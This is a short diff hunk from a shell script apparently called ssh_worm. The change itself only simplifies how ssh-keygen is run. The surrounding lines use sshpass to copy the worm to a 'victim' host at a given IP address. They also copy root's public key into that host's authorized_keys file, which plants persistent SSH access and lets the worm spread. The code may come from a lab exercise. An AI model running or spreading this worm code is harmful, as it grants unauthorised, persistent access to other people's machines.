@@ -10,12 +10,7 @@ sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victi
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-(
-	echo "\r"
-	sleep 1
-	echo "n\r"
-	sleep 1
-)|ssh-keygen
+ssh-keygen
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
